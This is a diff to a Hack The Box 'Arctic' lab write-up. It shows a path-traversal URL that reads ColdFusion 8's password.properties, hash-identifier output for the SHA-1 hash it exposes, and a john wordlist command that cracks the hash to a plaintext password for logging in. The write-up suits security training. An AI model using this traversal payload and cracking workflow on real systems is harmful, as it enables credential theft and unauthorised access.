@@ -79,6 +79,76 @@ After a little research, I found out that ColdFusion 8 passwords are typically s
 
 So we'll try to read the ```password.properties``` by navigating to the url ```?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en```
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b1a62ce8-2ebf-4770-99d3-9f40b7a9cd26)
+
+We found an encrypted password hehe. Lets try to identify the hash using the ```hash-identifier``` command
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]                                                                                                                                              
+└─$ hash-identifier                                                                                                                                                                             
+   #########################################################################                                                                                                                    
+   #     __  __                     __           ______    _____           #                                                                                                                    
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #                                                                                                                    
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #                                                                                                                    
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #                                                                                                                    
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #                                                                                                                    
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #                                                                                                                    
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+ HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+
+Possible Hashs:
+[+] SHA-1
+[+] MySQL5 - SHA-1(SHA-1($pass))
+
+Least Possible Hashs:
+[+] Tiger-160
+[+] Haval-160
+[+] RipeMD-160
+[+] SHA-1(HMAC)
+[+] Tiger-160(HMAC)
+[+] RipeMD-160(HMAC)
+[+] Haval-160(HMAC)
+[+] SHA-1(MaNGOS)
+[+] SHA-1(MaNGOS2)
+[+] sha1($pass.$salt)
+[+] sha1($salt.$pass)
+[+] sha1($salt.md5($pass))
+[+] sha1($salt.md5($pass).$salt)
+[+] sha1($salt.sha1($pass))
+[+] sha1($salt.sha1($salt.sha1($pass)))
+[+] sha1($username.$pass)
+[+] sha1($username.$pass.$salt)
+[+] sha1(md5($pass))
+[+] sha1(md5($pass).$salt)
+```
+It's ```sha1``` cool. We can use john to crack this
+
+command:```john hash.txt  --wordlist=/home/bl4ck4non/Documents/rockyou.txt  --format=RAW-sha1```
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]
+└─$ cat hash.txt
+2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Arctic]
+└─$ john hash.txt  --wordlist=/home/bl4ck4non/Documents/rockyou.txt  --format=RAW-sha1
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+happyday         (?)     
+1g 0:00:00:00 DONE (2023-09-24 11:35) 1.428g/s 7314p/s 7314c/s 7314C/s jodie..babygrl
+Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
+Session completed.
+```
+We got the password to be ```happyday```. This means now we'll be able to login to the webpage.
+
+Well lets do that
 
 
 
